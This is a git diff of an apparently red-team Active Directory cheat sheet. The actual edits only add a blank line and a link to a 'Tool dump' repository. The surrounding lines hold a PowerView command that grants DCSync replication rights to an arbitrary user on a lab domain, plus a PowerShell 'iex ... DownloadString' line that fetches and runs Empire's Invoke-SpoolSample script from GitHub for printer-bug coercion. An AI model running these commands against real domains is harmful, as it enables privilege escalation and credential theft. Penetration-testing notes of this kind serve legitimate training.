@@ -430,6 +430,7 @@ Add FullControl permissions ("GenericAll" rights) for an arbitrary user to Admin
 
 #### Domain Replication Privileges 
 Add DCSync rights ("Replicating Directory Changes*" (x3) permissions) for an arbitrary user 
+
 https://adsecurity.org/?p=1729
 
 ```Add-ObjectAcl -TargetDistinguishedName 'DC=bcorp,DC=ecorp,DC=lab' -PrincipalSamAccountName Mary -Rights DCSync -Verbose``` - PowerView
@@ -689,7 +690,7 @@ klist
 # Printer bug - why wait when you can spool?
 https://github.com/leechristensen/SpoolSample
 
-compiled binary available here - Tool dump
+compiled binary available here - [Tool dump](https://github.com/conma293/mvp) 
 
 ```
 iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/exploitation/Invoke-SpoolSample.ps1")
